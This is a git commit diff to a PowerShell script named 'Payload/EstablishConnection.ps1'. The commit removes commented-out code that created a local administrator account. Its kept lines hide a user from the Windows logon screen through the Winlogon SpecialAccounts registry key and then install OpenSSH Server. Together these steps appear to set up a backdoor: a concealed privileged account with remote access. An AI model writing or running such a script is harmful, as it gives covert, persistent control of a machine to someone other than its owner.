22cae746421c8167fdf901d19a4cd9b3a0fc5ab8
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-10-29 01:41:34 +0800

    Update

--- Payload/EstablishConnection.ps1
+++ Payload/EstablishConnection.ps1
@@ -1,34 +1,4 @@
-# # Generate a random password
-# function RandomPasswordGenerator {
-#     return -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
-# }
-
-# $Username = "ICU"
-# $Password = RandomPasswordGenerator  # Corrected variable name
-
-# # Remove the local user if it exists
-# if (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue) {
-#     Remove-LocalUser -Name $Username
-# }
-
-# function CreateAdministrator {
-#     [CmdletBinding()]
-#     param (
-#         [string] $Username,
-#         [securestring] $Password
-#     )    
-#     begin {
-#     }    
-#     process {
-#         New-LocalUser "$Username" -Password $Password -FullName "$Username" -Description "Temporary local admin"
-#         Write-Verbose "$Username local user created"
-#         Add-LocalGroupMember -Group "Administrators" -Member "$Username"
-#         Write-Verbose "$Username added to the local administrator group"
-#     }    
-#     end {
-#     }
-# }
-
+# Generate random password
 function Generate-StrongPassword {
     # Generate a stronger password with at least one upper case letter, one lower case letter, one digit, and one special character.
     $specialCharacters = '!@#$%^&*()_+-=[]{}|;:,.<>?'
@@ -70,15 +40,6 @@ $RegistryValue = '00000000'
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
 New-ItemProperty -Path $RegistryPath -Name $Username -Value $RegistryValue -PropertyType DWORD -Force
-
-# # Create a new local user with administrator privileges
-# New-LocalUser $Username -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName $Username -Description "Temporary Local Administrator"
-
-# # Add the new user to the Administrators group
-# Add-LocalGroupMember -Group "Administrators" -Member $Username
-
-# # Hide the user from the Windows logon screen
-# New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWORD -Force
 
 # Install the OpenSSH Server
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
